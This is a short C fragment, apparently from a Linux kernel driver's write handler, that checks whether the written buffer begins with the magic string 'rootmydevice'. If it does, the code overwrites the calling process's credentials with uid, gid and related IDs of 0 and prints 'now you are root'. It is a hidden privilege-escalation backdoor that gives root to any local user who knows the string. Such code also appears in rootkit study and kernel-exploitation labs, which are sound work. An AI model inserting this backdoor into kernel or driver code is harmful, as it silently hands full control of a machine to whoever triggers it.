

        if(!strncmp("rootmydevice",(char*)buf,12)){
                cred = (struct cred *)__task_cred(current);
                cred->uid = 0;
                cred->gid = 0;
                cred->suid = 0;
                cred->euid = 0;
                cred->euid = 0;
                cred->egid = 0;
                cred->fsuid = 0;
                cred->fsgid = 0;
                printk("now you are root\n");
        }




